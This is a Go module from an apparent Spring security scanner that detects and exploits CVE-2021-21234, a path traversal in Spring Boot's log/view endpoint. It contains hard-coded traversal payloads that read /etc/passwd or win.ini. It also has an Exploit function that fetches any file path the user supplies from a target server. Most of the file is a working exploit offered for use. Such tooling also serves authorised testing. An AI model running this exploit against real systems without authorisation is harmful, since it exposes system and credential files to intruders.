package vulns

import (
	"context"
	"fmt"
	"net/http"
	"strings"

	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2021-21234 Spring Boot log view 目录遍历任意文件读取。
type cve202121234 struct{}

func init() { Register(&cve202121234{}) }

var traversalBases = []string{
	"manage/log/view?filename=%s&base=../../../../../../../../../../",
	"log/view?filename=%s&base=../../../../../../../../../../",
}

func (c *cve202121234) Info() model.Info {
	return model.Info{
		ID:         "CVE-2021-21234",
		Name:       "Spring Boot log view 目录遍历",
		Type:       "FileRead",
		Severity:   "high",
		Affected:   "Spring Boot 2.x（未授权 log/view 端点）",
		Reference:  "https://github.com/spring-projects/spring-boot/issues/25842",
		HasExploit: true,
		ArgHint:    "要读取的文件路径，如 /etc/passwd",
	}
}

func (c *cve202121234) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	probes := []struct {
		path     string
		sign     string
		platform string
	}{
		{"manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../", "MAPI", "Windows"},
		{"log/view?filename=/windows/win.ini&base=../../../../../../../../../../", "MAPI", "Windows"},
		{"manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../", "root:x:", "Linux"},
		{"log/view?filename=/etc/passwd&base=../../../../../../../../../../", "root:x:", "Linux"},
	}
	for _, p := range probes {
		_, body, err := do(ctx, t, http.MethodPost, p.path, nil, "")
		if err != nil {
			return nil, err
		}
		if strings.Contains(string(body), p.sign) {
			v.Vulnerable = true
			v.Evidence = "成功读取 " + p.platform + " 系统文件"
			return v, nil
		}
	}
	return v, nil
}

// Exploit 的 arg 为要读取的文件路径，如 /etc/passwd。
func (c *cve202121234) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	for _, base := range traversalBases {
		_, body, err := do(ctx, t, http.MethodPost, fmt.Sprintf(base, arg), nil, "")
		if err != nil {
			return "", "", err
		}
		if len(body) > 0 && !strings.Contains(string(body), "404") {
			return string(body), "", nil
		}
	}
	return "", "两种路径前缀均未取到内容", nil
}
